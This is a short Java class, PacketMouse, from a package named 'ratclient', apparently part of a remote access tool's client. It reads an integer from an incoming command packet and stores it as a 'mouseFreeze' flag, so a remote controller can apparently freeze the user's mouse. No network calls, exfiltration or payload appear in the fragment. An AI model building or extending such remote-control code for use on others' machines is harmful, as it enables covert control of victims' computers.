package ej.ratclient.packet.impl;

import ej.ratclient.packet.PacketType;
import ej.ratclient.packet.Packet;

public class PacketMouse implements PacketType {

    public static int mouseFreeze = 0;

    @Override
    public void handlePacket(Packet packet) {
        mouseFreeze = packet.getInt();
    }
}
